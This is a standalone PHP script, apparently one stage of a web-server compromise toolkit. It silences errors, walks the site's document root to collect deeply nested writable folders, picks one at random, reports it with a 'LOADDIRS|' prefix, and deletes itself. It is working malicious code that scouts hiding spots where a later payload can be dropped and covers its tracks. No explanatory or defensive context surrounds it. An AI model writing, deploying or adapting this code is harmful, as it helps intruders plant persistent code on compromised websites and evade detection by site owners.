<?php
		//set_time_limit(0);
		error_reporting(0);
		ini_set("max_execution_time", 0);
		ini_set("upload_max_filesize","528M");
		ini_set("post_max_size","1024M");
		ini_set("memory_limit","1024M");
		ini_set("magic_quotes_runtime", false);
		ini_set("magic_quotes_gpc", false);
		ini_set("pcre.recursion_limit",700000);
		ini_set("pcre.backtrack_limit",7000000);
		ini_set("display_errors", false);
		
		if (!empty($_SERVER["DOCUMENT_ROOT"])) {
			$droot = $_SERVER["DOCUMENT_ROOT"]."/";
		}
		else {
			$droot = rtrim(str_replace("", "/", dirname(__FILE__)), "/")."/";
		}
		
		define('ROOT', $droot);
		
		$folders = array();
		
		function recursive_subfolders($folders) {
 	 		
    		$path = ROOT;
     		
    		if ($dir = opendir($path)) {
    		     $j = 0;
      		   while (($file = readdir($dir)) !== false) {
      		       if ($file != '.' && $file != '..' && is_dir($path.$file)) {
      		           $j++;
      		           $folders[$j] = $path . $file;
       		      }
      		   }
   		  	}
			closedir($dir);
  		   
  		   $j = count($folders);
  		   foreach ($folders as $folder) {
   		      if ($dir = opendir($folder)) {
    		         while (($file = readdir($dir)) !== false) {
      		           $pathto = $folder. '/' . $file;
       		          if ($file != '.' && $file != '..' && is_dir($pathto) && !in_array($pathto, $folders)) {
       		              $j++;
         		            $folders[$j] = $pathto;
         		            //$folders = recursive_subfolders($folders);
         		        }
       		      }
     		    }
     		    closedir($dir);
  		   }
   		  
  		   sort($folders);
  		   return $folders;
		}
		
		$folders = recursive_subfolders($folders);
		
		$wfolders = array();
		foreach ($folders as $_folders) {
			if(is_writable($_folders)) {
				$wexpl = explode("/",str_replace($droot,"",$_folders));
				if (count($wexpl) > 1) {
					foreach (glob($_folders."/*", GLOB_NOSORT) as $_folders_) {
						if(is_dir($_folders_)) {
							foreach (glob($_folders_."/*", GLOB_NOSORT) as $__folders_) {
								if(is_dir($__folders_)) {
									foreach (glob($__folders_."/*", GLOB_NOSORT) as $__folders__) {
										if(is_dir($__folders__)) {
											foreach (glob($__folders__."/*", GLOB_NOSORT) as $___folders___) {
												if(is_dir($___folders___)) {
													foreach (glob($___folders___."/*", GLOB_NOSORT) as $____folders____) {
														if(is_dir($____folders____)) {
															foreach (glob($____folders____."/*", GLOB_NOSORT) as $_____folders_____) {
																if(is_dir($_____folders_____)) {
																	foreach (glob($_____folders_____."/*", GLOB_NOSORT) as $______folders______) {
																		if(is_dir($______folders______)) {
																			$wfolders[] = $droot.'||'.str_replace($droot,'',$______folders______);
																		}
																	}
																	$wfolders[] = $droot.'||'.str_replace($droot,'',$_____folders_____);
																}
															}
															$wfolders[] = $droot.'||'.str_replace($droot,'',$____folders____);
														}
													}
													$wfolders[] = $droot.'||'.str_replace($droot,'',$___folders___);
												}
											}
											$wfolders[] = $droot.'||'.str_replace($droot,'',$__folders__);
										}
									}
									$wfolders[] = $droot.'||'.str_replace($droot,'',$__folders_);
								}
							}
							$wfolders[] = $droot.'||'.str_replace($droot,'',$_folders_);
						}
					}
					$wfolders[] = $droot.'||'.str_replace($droot,'',$_folders);
				}
			}
		}
		$sfolders = array();
		foreach ($wfolders as $_wfolders) {
			$_wfolders_ = str_replace("||","",$_wfolders);
			if(is_writable($_wfolders_)) {
				$sexpl = explode("/",str_replace($droot,"",$_wfolders_));
				$sfolders[count($sexpl)][] = $droot."||".str_replace($droot,"",$_wfolders_);
			}
		}
		if (!empty($sfolders)) {
			$mx = max(array_keys($sfolders));
			
				$mn = min(array_keys($sfolders));
				if ($mx > $mn && $mx > 2) {
					$mr = rand(1,$mx);
				}
				else {
					$mr = $mx;
				}
				shuffle($sfolders[$mr]);
				echo "LOADDIRS|".trim($sfolders[$mr][0]);
				
		}
		unlink(__FILE__);
		?>